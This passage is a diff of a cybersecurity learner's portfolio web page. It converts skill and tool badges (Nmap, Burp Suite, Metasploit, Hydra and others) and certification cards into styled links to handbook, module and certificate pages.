@@ -274,15 +274,39 @@
 </a>
 </div>
 <div class="pt-4 border-t border-border-hairline/60">
-<div class="font-mono text-[10px] text-outline mb-2">ACTIVE VECTOR PROFILE // RUNTIME TOOLKIT</div>
+<div class="font-mono text-[10px] text-outline mb-2 flex items-center justify-between">
+  <span>ACTIVE VECTOR PROFILE // RUNTIME TOOLKIT</span>
+  <span class="text-primary font-mono text-[9px] hidden sm:inline">CLICK TOOL FOR MANUAL &amp; COMMANDS</span>
+</div>
 <div class="flex flex-wrap gap-2">
-<span class="px-2.5 py-1 rounded bg-surface-raised border border-border-hairline font-mono text-xs text-on-surface-variant">Kali Linux (Daily)</span>
-<span class="px-2.5 py-1 rounded bg-surface-raised border border-border-hairline font-mono text-xs text-on-surface-variant">Wireshark</span>
-<span class="px-2.5 py-1 rounded bg-surface-raised border border-border-hairline font-mono text-xs text-on-surface-variant">Burp Suite</span>
-<span class="px-2.5 py-1 rounded bg-surface-raised border border-border-hairline font-mono text-xs text-on-surface-variant">Nmap</span>
-<span class="px-2.5 py-1 rounded bg-surface-raised border border-border-hairline font-mono text-xs text-on-surface-variant">Metasploit</span>
-<span class="px-2.5 py-1 rounded bg-surface-raised border border-border-hairline font-mono text-xs text-on-surface-variant">Python / Bash</span>
-<span class="px-2.5 py-1 rounded bg-surface-raised border border-border-hairline font-mono text-xs text-secondary">Ollama / Qwen3-Coder</span>
+<a href="handbook/linux.html" class="px-2.5 py-1 rounded bg-surface-raised border border-border-hairline hover:border-primary font-mono text-xs text-on-surface-variant hover:text-primary transition-all flex items-center gap-1 group" title="Kali Linux — Daily Driver OS &amp; Hardened Shell Environment">
+  <span>Kali Linux (Daily)</span>
+  <span class="text-[9px] opacity-60 group-hover:opacity-100 group-hover:translate-x-0.5 transition-all">↗</span>
+</a>
+<a href="handbook/modules/network-security.html" class="px-2.5 py-1 rounded bg-surface-raised border border-border-hairline hover:border-primary font-mono text-xs text-on-surface-variant hover:text-primary transition-all flex items-center gap-1 group" title="Wireshark — Deep Packet Inspection &amp; Protocol Decode">
+  <span>Wireshark</span>
+  <span class="text-[9px] opacity-60 group-hover:opacity-100 group-hover:translate-x-0.5 transition-all">↗</span>
+</a>
+<a href="handbook/modules/web-security.html" class="px-2.5 py-1 rounded bg-surface-raised border border-border-hairline hover:border-secondary font-mono text-xs text-on-surface-variant hover:text-secondary transition-all flex items-center gap-1 group" title="Burp Suite — Interception Proxy, Repeater &amp; Parameter Tampering">
+  <span>Burp Suite</span>
+  <span class="text-[9px] opacity-60 group-hover:opacity-100 group-hover:translate-x-0.5 transition-all">↗</span>
+</a>
+<a href="handbook/nmap.html" class="px-2.5 py-1 rounded bg-surface-raised border border-border-hairline hover:border-primary font-mono text-xs text-on-surface-variant hover:text-primary transition-all flex items-center gap-1 group" title="Nmap — Network Scanning, Fingerprinting &amp; NSE Audits">
+  <span>Nmap</span>
+  <span class="text-[9px] opacity-60 group-hover:opacity-100 group-hover:translate-x-0.5 transition-all">↗</span>
+</a>
+<a href="handbook/metasploit.html" class="px-2.5 py-1 rounded bg-surface-raised border border-border-hairline hover:border-primary font-mono text-xs text-on-surface-variant hover:text-primary transition-all flex items-center gap-1 group" title="Metasploit — Modular Exploit Execution &amp; Meterpreter Telemetry">
+  <span>Metasploit</span>
+  <span class="text-[9px] opacity-60 group-hover:opacity-100 group-hover:translate-x-0.5 transition-all">↗</span>
+</a>
+<a href="handbook/modules/security-automation.html" class="px-2.5 py-1 rounded bg-surface-raised border border-border-hairline hover:border-secondary font-mono text-xs text-on-surface-variant hover:text-secondary transition-all flex items-center gap-1 group" title="Python / Bash — Custom Security Scripting &amp; Automation Pipelines">
+  <span>Python / Bash</span>
+  <span class="text-[9px] opacity-60 group-hover:opacity-100 group-hover:translate-x-0.5 transition-all">↗</span>
+</a>
+<a href="projects/autonomous-pentesting-agent.html" class="px-2.5 py-1 rounded bg-surface-raised border border-secondary/40 hover:border-secondary font-mono text-xs text-secondary hover:text-secondary-container transition-all flex items-center gap-1 group" title="Ollama / Qwen3-Coder — Private Local Inference with Zero Telemetry">
+  <span>Ollama / Qwen3-Coder</span>
+  <span class="text-[9px] opacity-60 group-hover:opacity-100 group-hover:translate-x-0.5 transition-all">↗</span>
+</a>
 </div>
 </div>
 </div>
@@ -427,13 +451,13 @@
 </div>
 <div class="grid grid-cols-1 md:grid-cols-3 gap-6">
 <!-- Card 1: TryHackMe Achievement Block -->
-<div class="bg-surface-subtle p-6 rounded-xl border border-primary/40 relative group hover:border-primary transition-all">
+<div class="bg-surface-subtle p-6 rounded-xl border border-primary/40 relative group hover:border-primary transition-all cursor-pointer" onclick="window.location.href='certificates.html'">
 <div class="flex items-center justify-between mb-4">
 <span class="px-2 py-1 rounded bg-canvas-base border border-primary/40 font-mono text-[10px] text-primary font-bold flex items-center gap-1.5">
 <span class="w-1.5 h-1.5 rounded-full bg-primary animate-pulse"></span>
           VERIFIED RANK
         </span>
-<span class="material-symbols-outlined text-primary text-2xl">military_tech</span>
+<span class="material-symbols-outlined text-primary text-2xl group-hover:scale-110 transition-transform">military_tech</span>
 </div>
 <div class="text-4xl font-extrabold text-primary mb-1">
         TOP <span data-counter="2" data-suffix="%">2%</span>
@@ -445,17 +469,17 @@
         Maintained top 2% global standing through active problem-solving across 140+ interactive challenge rooms, covering network enumeration, web vulnerabilities, Linux privilege escalation, password attacks, and security tooling in authorized educational environments.
       </p>
 <div class="mt-4 pt-3 border-t border-border-hairline flex items-center justify-between font-mono text-[10px] text-outline">
-<span><span data-counter="140" data-suffix="+">140+</span> TRYHACKME ROOMS COMPLETED</span>
-<span class="text-primary font-mono font-bold">TOP 2% GLOBALLY</span>
+<span><span data-counter="140" data-suffix="+">140+</span> TRYHACKME ROOMS</span>
+<a href="certificates.html" class="text-primary font-mono font-bold hover:underline flex items-center gap-1"><span>VERIFY RANK ↗</span></a>
 </div>
 </div>
 <!-- Card 2: Google Cybersecurity Professional -->
-<div class="bg-surface-subtle p-6 rounded-xl border border-border-hairline group hover:border-secondary transition-all">
+<div class="bg-surface-subtle p-6 rounded-xl border border-border-hairline group hover:border-secondary transition-all cursor-pointer" onclick="window.location.href='certificate-viewer.html?id=google-cybersecurity'">
 <div class="flex items-center justify-between mb-4">
 <span class="px-2 py-1 rounded bg-canvas-base border border-secondary/40 font-mono text-[10px] text-secondary font-bold">
           INDUSTRY CERTIFICATION
         </span>
-<span class="material-symbols-outlined text-secondary text-2xl">workspace_premium</span>
+<span class="material-symbols-outlined text-secondary text-2xl group-hover:scale-110 transition-transform">workspace_premium</span>
 </div>
 <div class="text-4xl font-extrabold text-secondary mb-1">
         GOOGLE
@@ -468,16 +492,16 @@
       </p>
 <div class="mt-4 pt-3 border-t border-border-hairline flex items-center justify-between font-mono text-[10px] text-outline">
 <span>ISSUER: GOOGLE</span>
-<span class="text-secondary font-mono">CREDENTIAL_ACTIVE</span>
+<a href="certificate-viewer.html?id=google-cybersecurity" class="text-secondary font-mono font-bold hover:underline flex items-center gap-1"><span>VIEW CREDENTIAL ↗</span></a>
 </div>
 </div>
 <!-- Card 3: Verified Learning Tracks -->
-<div class="bg-surface-subtle p-6 rounded-xl border border-border-hairline group hover:border-border-highlight transition-all">
+<div class="bg-surface-subtle p-6 rounded-xl border border-border-hairline group hover:border-primary/50 transition-all cursor-pointer" onclick="window.location.href='certificates.html'">
 <div class="flex items-center justify-between mb-4">
 <span class="px-2 py-1 rounded bg-canvas-base border border-border-hairline font-mono text-[10px] text-on-surface-variant font-bold">
           LEARNING PATHS
         </span>
-<span class="material-symbols-outlined text-on-surface text-2xl">school</span>
+<span class="material-symbols-outlined text-on-surface text-2xl group-hover:scale-110 transition-transform">school</span>
 </div>
 <div class="text-4xl font-extrabold text-on-surface mb-1">
         3 TRACKS
@@ -486,21 +510,21 @@
         Structured Security Curricula
       </div>
 <div class="space-y-2 pt-1 font-mono text-xs text-on-surface-variant">
-<div class="flex items-center justify-between p-1.5 rounded bg-canvas-base/60 border border-border-hairline">
+<div class="flex items-center justify-between p-1.5 rounded bg-canvas-base/60 border border-border-hairline hover:border-primary/40 transition-colors">
 <span class="text-on-surface font-medium flex items-center gap-1.5">
 <span class="material-symbols-outlined text-primary text-sm">check_circle</span>
             TryHackMe Pre Security
           </span>
 <span class="font-mono text-[10px] text-primary">COMPLETED</span>
 </div>
-<div class="flex items-center justify-between p-1.5 rounded bg-canvas-base/60 border border-border-hairline">
+<div class="flex items-center justify-between p-1.5 rounded bg-canvas-base/60 border border-border-hairline hover:border-primary/40 transition-colors">
 <span class="text-on-surface font-medium flex items-center gap-1.5">
 <span class="material-symbols-outlined text-primary text-sm">check_circle</span>
             TryHackMe Cyber Security 101
           </span>
 <span class="font-mono text-[10px] text-primary">COMPLETED</span>
 </div>
-<div class="flex items-center justify-between p-1.5 rounded bg-canvas-base/60 border border-border-hairline">
+<div class="flex items-center justify-between p-1.5 rounded bg-canvas-base/60 border border-border-hairline hover:border-secondary/40 transition-colors">
 <span class="text-on-surface font-medium flex items-center gap-1.5">
 <span class="material-symbols-outlined text-secondary text-sm">pending</span>
             TryHackMe Jr Penetration Tester
@@ -510,7 +534,7 @@
 </div>
 <div class="mt-4 pt-3 border-t border-border-hairline flex items-center justify-between font-mono text-[10px] text-outline">
 <span>PLATFORM: TRYHACKME</span>
-<span class="text-on-surface font-mono">STRUCTURED_TRACKS</span>
+<a href="certificates.html" class="text-on-surface hover:text-primary font-mono font-bold hover:underline flex items-center gap-1"><span>VIEW TRACKS ↗</span></a>
 </div>
 </div>
 </div>
@@ -531,117 +555,183 @@
 </div>
 <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
 <!-- Domain 1: Reconnaissance & Enumeration -->
-<div class="bg-surface-subtle p-5 rounded-xl border border-border-hairline space-y-3">
+<div class="bg-surface-subtle p-5 rounded-xl border border-border-hairline space-y-3 hover:border-primary/50 transition-colors">
+<div class="flex items-center justify-between">
 <div class="flex items-center gap-2 font-mono text-xs text-primary font-bold">
 <span class="material-symbols-outlined text-base">radar</span>
 <span>RECONNAISSANCE &amp; ENUMERATION</span>
 </div>
+<a href="handbook/modules/reconnaissance.html" class="text-[10px] text-primary hover:underline font-mono flex items-center gap-0.5">Module 01 ↗</a>
+</div>
 <p class="text-xs text-on-surface-variant">Structured discovery techniques applied to authorized educational challenge targets.</p>
 <div class="flex flex-wrap gap-1.5">
-<span class="px-2 py-1 rounded bg-canvas-base border border-primary/30 font-mono text-[10px] text-primary">Nmap Scanning Profiles</span>
-<span class="px-2 py-1 rounded bg-canvas-base border border-border-hairline font-mono text-[10px] text-on-surface">Netcat Connectivity</span>
-<span class="px-2 py-1 rounded bg-canvas-base border border-secondary/30 font-mono text-[10px] text-secondary">ffuf Endpoint Fuzzing</span>
-<span class="px-2 py-1 rounded bg-canvas-base border border-border-hairline font-mono text-[10px] text-on-surface">Service Enumeration</span>
-<span class="px-2 py-1 rounded bg-canvas-base border border-border-hairline font-mono text-[10px] text-on-surface">Network Reconnaissance</span>
-<span class="px-2 py-1 rounded bg-canvas-base border border-border-hairline font-mono text-[10px] text-on-surface">Web Reconnaissance</span>
-<span class="px-2 py-1 rounded bg-canvas-base border border-border-hairline font-mono text-[10px] text-on-surface">Content Discovery</span>
-<span class="px-2 py-1 rounded bg-canvas-base border border-border-hairline font-mono text-[10px] text-on-surface">Banner Grabbing</span>
+<a href="handbook/nmap.html" class="px-2 py-1 rounded bg-canvas-base border border-primary/30 font-mono text-[10px] text-primary hover:border-primary hover:bg-primary/10 transition-all flex items-center gap-1 group" title="Nmap Scanning Profiles — SYN scans, OS detection & NSE audits"><span>Nmap Scanning Profiles</span><span class="opacity-60 group-hover:opacity-100">↗</span></a>
+<a href="handbook/modules/tools-reference.html#tool-netcat" class="px-2 py-1 rounded bg-canvas-base border border-border-hairline font-mono text-[10px] text-on-surface hover:border-primary hover:text-primary hover:bg-primary/10 transition-all flex items-center gap-1 group" title="Netcat Connectivity — Port banner probing & raw TCP listeners"><span>Netcat Connectivity</span><span class="opacity-60 group-hover:opacity-100">↗</span></a>
+<a href="handbook/modules/tools-reference.html#tool-ffuf" class="px-2 py-1 rounded bg-canvas-base border border-secondary/30 font-mono text-[10px] text-secondary hover:border-secondary hover:bg-secondary/10 transition-all flex items-center gap-1 group" title="ffuf Endpoint Fuzzing — High-speed web directory & parameter fuzzing"><span>ffuf Endpoint Fuzzing</span><span class="opacity-60 group-hover:opacity-100">↗</span></a>
+<a href="handbook/modules/reconnaissance.html" class="px-2 py-1 rounded bg-canvas-base border border-border-hairline font-mono text-[10px] text-on-surface hover:border-primary hover:text-primary hover:bg-primary/10 transition-all flex items-center gap-1 group" title="Service Enumeration — Version fingerprinting & banner verification"><span>Service Enumeration</span><span class="opacity-60 group-hover:opacity-100">↗</span></a>
+<a href="handbook/modules/reconnaissance.html" class="px-2 py-1 rounded bg-canvas-base border border-border-hairline font-mono text-[10px] text-on-surface hover:border-primary hover:text-primary hover:bg-primary/10 transition-all flex items-center gap-1 group" title="Network Reconnaissance — Subnet sweeps & live host discovery"><span>Network Reconnaissance</span><span class="opacity-60 group-hover:opacity-100">↗</span></a>
+<a href="handbook/modules/web-security.html" class="px-2 py-1 rounded bg-canvas-base border border-border-hairline font-mono text-[10px] text-on-surface hover:border-secondary hover:text-secondary hover:bg-secondary/10 transition-all flex items-center gap-1 group" title="Web Reconnaissance — Virtual host discovery & robots/sitemap inspection"><span>Web Reconnaissance</span><span class="opacity-60 group-hover:opacity-100">↗</span></a>
+<a href="handbook/modules/tools-reference.html#tool-ffuf" class="px-2 py-1 rounded bg-canvas-base border border-border-hairline font-mono text-[10px] text-on-surface hover:border-primary hover:text-primary hover:bg-primary/10 transition-all flex items-center gap-1 group" title="Content Discovery — Wordlist fuzzing for hidden web endpoints"><span>Content Discovery</span><span class="opacity-60 group-hover:opacity-100">↗</span></a>
+<a href="handbook/modules/network-security.html" class="px-2 py-1 rounded bg-canvas-base border border-border-hairline font-mono text-[10px] text-on-surface hover:border-secondary hover:text-secondary hover:bg-secondary/10 transition-all flex items-center gap-1 group" title="Banner Grabbing — Raw service header & daemon version extraction"><span>Banner Grabbing</span><span class="opacity-60 group-hover:opacity-100">↗</span></a>
 </div>
 </div>
 <!-- Domain 2: Networking & Protocols -->
-<div class="bg-surface-subtle p-5 rounded-xl border border-border-hairline space-y-3">
+<div class="bg-surface-subtle p-5 rounded-xl border border-border-hairline space-y-3 hover:border-secondary/50 transition-colors">
+<div class="flex items-center justify-between">
 <div class="flex items-center gap-2 font-mono text-xs text-secondary font-bold">
 <span class="material-symbols-outlined text-base">hub</span>
 <span>NETWORKING &amp; PROTOCOLS</span>
 </div>
+<a href="handbook/modules/network-security.html" class="text-[10px] text-secondary hover:underline font-mono flex items-center gap-0.5">Module 02 ↗</a>
+</div>
 <p class="text-xs text-on-surface-variant">Protocol analysis, traffic dissection, and layer-by-layer network exploration.</p>
 <div class="flex flex-wrap gap-1.5">
-<span class="px-2 py-1 rounded bg-canvas-base border border-secondary/30 font-mono text-[10px] text-secondary">TCP/IP Architecture</span>
-<span class="px-2 py-1 rounded bg-canvas-base border border-border-hairline font-mono text-[10px] text-on-surface">TCP / UDP Fundamentals</span>
-<span class="px-2 py-1 rounded bg-canvas-base border border-border-hairline font-mono text-[10px] text-on-surface">DNS Analysis</span>
-<span class="px-2 py-1 rounded bg-canvas-base border border-border-hairline font-mono text-[10px] text-on-surface">HTTP / HTTPS Inspection</span>
-<span class="px-2 py-1 rounded bg-canvas-base border border-border-hairline font-mono text-[10px] text-on-surface">SSH Remote Access</span>
-<span class="px-2 py-1 rounded bg-canvas-base border border-border-hairline font-mono text-[10px] text-on-surface">ICMP &amp; DHCP</span>
-<span class="px-2 py-1 rounded bg-canvas-base border border-border-hairline font-mono text-[10px] text-on-surface">Subnetting (VLSM)</span>
-<span class="px-2 py-1 rounded bg-canvas-base border border-primary/30 font-mono text-[10px] text-primary">Wireshark Packet Inspection</span>
+<a href="handbook/modules/network-security.html" class="px-2 py-1 rounded bg-canvas-base border border-secondary/30 font-mono text-[10px] text-secondary hover:border-secondary hover:bg-secondary/10 transition-all flex items-center gap-1 group" title="TCP/IP Architecture — 4-layer model, handshake & packet encapsulation"><span>TCP/IP Architecture</span><span class="opacity-60 group-hover:opacity-100">↗</span></a>
+<a href="handbook/modules/network-security.html" class="px-2 py-1 rounded bg-canvas-base border border-border-hairline font-mono text-[10px] text-on-surface hover:border-secondary hover:text-secondary hover:bg-secondary/10 transition-all flex items-center gap-1 group" title="TCP / UDP Fundamentals — SYN/ACK flags, connectionless UDP & port ranges"><span>TCP / UDP Fundamentals</span><span class="opacity-60 group-hover:opacity-100">↗</span></a>
+<a href="handbook/modules/network-security.html" class="px-2 py-1 rounded bg-canvas-base border border-border-hairline font-mono text-[10px] text-on-surface hover:border-secondary hover:text-secondary hover:bg-secondary/10 transition-all flex items-center gap-1 group" title="DNS Analysis — Forward/reverse lookup, zone transfers & DNS record types"><span>DNS Analysis</span><span class="opacity-60 group-hover:opacity-100">↗</span></a>
+<a href="handbook/modules/network-security.html" class="px-2 py-1 rounded bg-canvas-base border border-border-hairline font-mono text-[10px] text-on-surface hover:border-secondary hover:text-secondary hover:bg-secondary/10 transition-all flex items-center gap-1 group" title="HTTP / HTTPS Inspection — TLS handshakes, HTTP methods & response headers"><span>HTTP / HTTPS Inspection</span><span class="opacity-60 group-hover:opacity-100">↗</span></a>
+<a href="handbook/modules/tools-reference.html" class="px-2 py-1 rounded bg-canvas-base border border-border-hairline font-mono text-[10px] text-on-surface hover:border-secondary hover:text-secondary hover:bg-secondary/10 transition-all flex items-center gap-1 group" title="SSH Remote Access — Key exchange, hardened configs & port tunneling"><span>SSH Remote Access</span><span class="opacity-60 group-hover:opacity-100">↗</span></a>
+<a href="handbook/modules/network-security.html" class="px-2 py-1 rounded bg-canvas-base border border-border-hairline font-mono text-[10px] text-on-surface hover:border-secondary hover:text-secondary hover:bg-secondary/10 transition-all flex items-center gap-1 group" title="ICMP & DHCP — Echo requests, TTL evaluation & DORA handshake"><span>ICMP &amp; DHCP</span><span class="opacity-60 group-hover:opacity-100">↗</span></a>
+<a href="handbook/modules/network-security.html" class="px-2 py-1 rounded bg-canvas-base border border-border-hairline font-mono text-[10px] text-on-surface hover:border-secondary hover:text-secondary hover:bg-secondary/10 transition-all flex items-center gap-1 group" title="Subnetting (VLSM) — CIDR notation, subnet masks & network segmentation"><span>Subnetting (VLSM)</span><span class="opacity-60 group-hover:opacity-100">↗</span></a>
+<a href="handbook/modules/network-security.html" class="px-2 py-1 rounded bg-canvas-base border border-primary/30 font-mono text-[10px] text-primary hover:border-primary hover:bg-primary/10 transition-all flex items-center gap-1 group" title="Wireshark Packet Inspection — Protocol decoding & PCAP stream reassembly"><span>Wireshark Packet Inspection</span><span class="opacity-60 group-hover:opacity-100">↗</span></a>
 </div>
 </div>
 <!-- Domain 3: Linux Systems -->
-<div class="bg-surface-subtle p-5 rounded-xl border border-border-hairline space-y-3">
+<div class="bg-surface-subtle p-5 rounded-xl border border-border-hairline space-y-3 hover:border-primary/50 transition-colors">
+<div class="flex items-center justify-between">
 <div class="flex items-center gap-2 font-mono text-xs text-primary font-bold">
 <span class="material-symbols-outlined text-base">terminal</span>
 <span>LINUX SYSTEMS</span>
 </div>
+<a href="handbook/linux.html" class="text-[10px] text-primary hover:underline font-mono flex items-center gap-0.5">Module 03 ↗</a>
+</div>
 <p class="text-xs text-on-surface-variant">Daily Linux administration, CLI mastery, and operating system permission controls.</p>
-<div class="flex flex-wrap gap-1.5"><span class="px-2 py-1 rounded bg-canvas-base border font-mono text-[10px] text-primary border-primary/30">Kali Linux (Daily Driver)</span><span class="px-2 py-1 rounded bg-canvas-base border font-mono text-[10px] text-secondary border-secondary/30">Ubuntu / Debian</span><span class="px-2 py-1 rounded bg-canvas-base border font-mono text-[10px] text-primary border-primary/30">Bash Scripting &amp; Shell</span><span class="px-2 py-1 rounded bg-canvas-base border font-mono text-[10px] text-on-surface border-border-hairline">Linux Permissions &amp; Ownership</span><span class="px-2 py-1 rounded bg-canvas-base border font-mono text-[10px] text-on-surface border-border-hairline">Process Monitoring (ps, top, systemd)</span><span class="px-2 py-1 rounded bg-canvas-base border font-mono text-[10px] text-on-surface border-border-hairline">Filesystem Hierarchy</span><span class="px-2 py-1 rounded bg-canvas-base border font-mono text-[10px] text-on-surface border-border-hairline">Regex &amp; Text Utilities (grep, awk)</span></div>
+<div class="flex flex-wrap gap-1.5">
+<a href="handbook/linux.html" class="px-2 py-1 rounded bg-canvas-base border font-mono text-[10px] text-primary border-primary/30 hover:border-primary hover:bg-primary/10 transition-all flex items-center gap-1 group" title="Kali Linux — Daily driver security OS & offensive toolkit environment"><span>Kali Linux (Daily Driver)</span><span class="opacity-60 group-hover:opacity-100">↗</span></a>
+<a href="handbook/linux.html" class="px-2 py-1 rounded bg-canvas-base border font-mono text-[10px] text-secondary border-secondary/30 hover:border-secondary hover:bg-secondary/10 transition-all flex items-center gap-1 group" title="Ubuntu / Debian — Server administration & systemd service control"><span>Ubuntu / Debian</span><span class="opacity-60 group-hover:opacity-100">↗</span></a>
+<a href="handbook/linux.html" class="px-2 py-1 rounded bg-canvas-base border font-mono text-[10px] text-primary border-primary/30 hover:border-primary hover:bg-primary/10 transition-all flex items-center gap-1 group" title="Bash Scripting & Shell — One-liners, loops & automated log auditing"><span>Bash Scripting &amp; Shell</span><span class="opacity-60 group-hover:opacity-100">↗</span></a>
+<a href="handbook/linux.html" class="px-2 py-1 rounded bg-canvas-base border font-mono text-[10px] text-on-surface border-border-hairline hover:border-primary hover:text-primary hover:bg-primary/10 transition-all flex items-center gap-1 group" title="Linux Permissions & Ownership — chmod, chown, ACLs & SUID bit flags"><span>Linux Permissions &amp; Ownership</span><span class="opacity-60 group-hover:opacity-100">↗</span></a>
+<a href="handbook/linux.html" class="px-2 py-1 rounded bg-canvas-base border font-mono text-[10px] text-on-surface border-border-hairline hover:border-primary hover:text-primary hover:bg-primary/10 transition-all flex items-center gap-1 group" title="Process Monitoring — ps, top, htop, kill & systemctl daemon diagnosis"><span>Process Monitoring (ps, top)</span><span class="opacity-60 group-hover:opacity-100">↗</span></a>
+<a href="handbook/linux.html" class="px-2 py-1 rounded bg-canvas-base border font-mono text-[10px] text-on-surface border-border-hairline hover:border-primary hover:text-primary hover:bg-primary/10 transition-all flex items-center gap-1 group" title="Filesystem Hierarchy — /etc, /var/log, /proc, /dev & /tmp structures"><span>Filesystem Hierarchy</span><span class="opacity-60 group-hover:opacity-100">↗</span></a>
+<a href="handbook/linux.html" class="px-2 py-1 rounded bg-canvas-base border font-mono text-[10px] text-on-surface border-border-hairline hover:border-primary hover:text-primary hover:bg-primary/10 transition-all flex items-center gap-1 group" title="Regex & Text Utilities — grep, awk, sed, cut, sort & uniq stream filters"><span>Regex &amp; Text Utilities</span><span class="opacity-60 group-hover:opacity-100">↗</span></a>
+</div>
 </div>
 <!-- Domain 4: Web Application Security -->
-<div class="bg-surface-subtle p-5 rounded-xl border border-border-hairline space-y-3">
+<div class="bg-surface-subtle p-5 rounded-xl border border-border-hairline space-y-3 hover:border-secondary/50 transition-colors">
+<div class="flex items-center justify-between">
 <div class="flex items-center gap-2 font-mono text-xs text-secondary font-bold">
 <span class="material-symbols-outlined text-base">web</span>
 <span>WEB APPLICATION SECURITY</span>
 </div>
+<a href="handbook/modules/web-security.html" class="text-[10px] text-secondary hover:underline font-mono flex items-center gap-0.5">Module 04 ↗</a>
+</div>
 <p class="text-xs text-on-surface-variant">HTTP traffic auditing, parameter manipulation, and web vulnerability analysis in lab environments.</p>
-<div class="flex flex-wrap gap-1.5"><span class="px-2 py-1 rounded bg-canvas-base border font-mono text-[10px] text-primary border-primary/30 font-bold">OWASP Top 10</span><span class="px-2 py-1 rounded bg-canvas-base border font-mono text-[10px] text-danger-critical border-danger-critical/30 font-bold">SQL Injection (SQLi)</span><span class="px-2 py-1 rounded bg-canvas-base border font-mono text-[10px] text-secondary border-secondary/30">Cross-Site Scripting (XSS)</span><span class="px-2 py-1 rounded bg-canvas-base border font-mono text-[10px] text-on-surface border-border-hairline">IDOR Testing Patterns</span><span class="px-2 py-1 rounded bg-canvas-base border font-mono text-[10px] text-on-surface border-border-hairline">Session Vulnerabilities &amp; Auth</span><span class="px-2 py-1 rounded bg-canvas-base border font-mono text-[10px] text-primary border-primary/30">Burp Suite Interception &amp; Repeater</span><span class="px-2 py-1 rounded bg-canvas-base border font-mono text-[10px] text-on-surface border-border-hairline">HTTP Request / Response Tampering</span><span class="px-2 py-1 rounded bg-canvas-base border font-mono text-[10px] text-on-surface border-border-hairline">Endpoint Fuzzing (ffuf)</span></div>
+<div class="flex flex-wrap gap-1.5">
+<a href="handbook/modules/web-security.html" class="px-2 py-1 rounded bg-canvas-base border font-mono text-[10px] text-primary border-primary/30 font-bold hover:border-primary hover:bg-primary/10 transition-all flex items-center gap-1 group" title="OWASP Top 10 — Standard vulnerability taxonomy & remediation patterns"><span>OWASP Top 10</span><span class="opacity-60 group-hover:opacity-100">↗</span></a>
+<a href="payloads.html#cmdi" class="px-2 py-1 rounded bg-canvas-base border font-mono text-[10px] text-danger-critical border-danger-critical/30 font-bold hover:border-danger-critical hover:bg-danger-critical/10 transition-all flex items-center gap-1 group" title="SQL Injection (SQLi) — Error-based, UNION & blind SQLi payload testing"><span>SQL Injection (SQLi)</span><span class="opacity-60 group-hover:opacity-100">↗</span></a>
+<a href="handbook/modules/web-security.html" class="px-2 py-1 rounded bg-canvas-base border font-mono text-[10px] text-secondary border-secondary/30 hover:border-secondary hover:bg-secondary/10 transition-all flex items-center gap-1 group" title="Cross-Site Scripting (XSS) — Reflected, stored & DOM-based script injection"><span>Cross-Site Scripting (XSS)</span><span class="opacity-60 group-hover:opacity-100">↗</span></a>
+<a href="handbook/modules/web-security.html" class="px-2 py-1 rounded bg-canvas-base border font-mono text-[10px] text-on-surface border-border-hairline hover:border-secondary hover:text-secondary hover:bg-secondary/10 transition-all flex items-center gap-1 group" title="IDOR Testing Patterns — Insecure Direct Object References in REST APIs"><span>IDOR Testing Patterns</span><span class="opacity-60 group-hover:opacity-100">↗</span></a>
+<a href="handbook/modules/web-security.html" class="px-2 py-1 rounded bg-canvas-base border font-mono text-[10px] text-on-surface border-border-hairline hover:border-secondary hover:text-secondary hover:bg-secondary/10 transition-all flex items-center gap-1 group" title="Session Vulnerabilities & Auth — Cookie flags, JWT analysis & session fixation"><span>Session &amp; Auth</span><span class="opacity-60 group-hover:opacity-100">↗</span></a>
+<a href="handbook/modules/web-security.html" class="px-2 py-1 rounded bg-canvas-base border font-mono text-[10px] text-primary border-primary/30 hover:border-primary hover:bg-primary/10 transition-all flex items-center gap-1 group" title="Burp Suite Interception & Repeater — HTTP proxy analysis & parameter tampering"><span>Burp Suite Interception</span><span class="opacity-60 group-hover:opacity-100">↗</span></a>
+<a href="handbook/modules/web-security.html" class="px-2 py-1 rounded bg-canvas-base border font-mono text-[10px] text-on-surface border-border-hairline hover:border-secondary hover:text-secondary hover:bg-secondary/10 transition-all flex items-center gap-1 group" title="HTTP Request / Response Tampering — Header manipulation & payload crafting"><span>HTTP Tampering</span><span class="opacity-60 group-hover:opacity-100">↗</span></a>
+<a href="handbook/modules/tools-reference.html#tool-ffuf" class="px-2 py-1 rounded bg-canvas-base border font-mono text-[10px] text-on-surface border-border-hairline hover:border-primary hover:text-primary hover:bg-primary/10 transition-all flex items-center gap-1 group" title="Endpoint Fuzzing — ffuf content & query parameter discovery"><span>Endpoint Fuzzing (ffuf)</span><span class="opacity-60 group-hover:opacity-100">↗</span></a>
+</div>
 </div>
 <!-- Domain 5: Password & Credential Security -->
-<div class="bg-surface-subtle p-5 rounded-xl border border-border-hairline space-y-3">
+<div class="bg-surface-subtle p-5 rounded-xl border border-border-hairline space-y-3 hover:border-primary/50 transition-colors">
+<div class="flex items-center justify-between">
 <div class="flex items-center gap-2 font-mono text-xs text-primary font-bold">
 <span class="material-symbols-outlined text-base">password</span>
 <span>PASSWORD &amp; CREDENTIAL SECURITY</span>
 </div>
+<a href="handbook/modules/credential-security.html" class="text-[10px] text-primary hover:underline font-mono flex items-center gap-0.5">Module 05 ↗</a>
+</div>
 <p class="text-xs text-on-surface-variant">Authorized educational password auditing, hash analysis, and authentication validation.</p>
 <div class="flex flex-wrap gap-1.5">
-<span class="px-2 py-1 rounded bg-canvas-base border border-primary/30 font-mono text-[10px] text-primary">Dictionary Attacks</span>
-<span class="px-2 py-1 rounded bg-canvas-base border border-border-hairline font-mono text-[10px] text-on-surface">Brute-Force Methodology</span>
-<span class="px-2 py-1 rounded bg-canvas-base border border-secondary/30 font-mono text-[10px] text-secondary">Password Hashes (MD5/SHA/etc)</span>
-<span class="px-2 py-1 rounded bg-canvas-base border border-border-hairline font-mono text-[10px] text-on-surface">Hydra Login Audits</span>
-<span class="px-2 py-1 rounded bg-canvas-base border border-primary/30 font-mono text-[10px] text-primary">Hashcat Recovery</span>
-<span class="px-2 py-1 rounded bg-canvas-base border border-border-hairline font-mono text-[10px] text-on-surface">John the Ripper</span>
-<span class="px-2 py-1 rounded bg-canvas-base border border-border-hairline font-mono text-[10px] text-outline">rockyou Wordlist Labs</span>
+<a href="handbook/modules/credential-security.html" class="px-2 py-1 rounded bg-canvas-base border border-primary/30 font-mono text-[10px] text-primary hover:border-primary hover:bg-primary/10 transition-all flex items-center gap-1 group" title="Dictionary Attacks — Wordlist-based authentication testing"><span>Dictionary Attacks</span><span class="opacity-60 group-hover:opacity-100">↗</span></a>
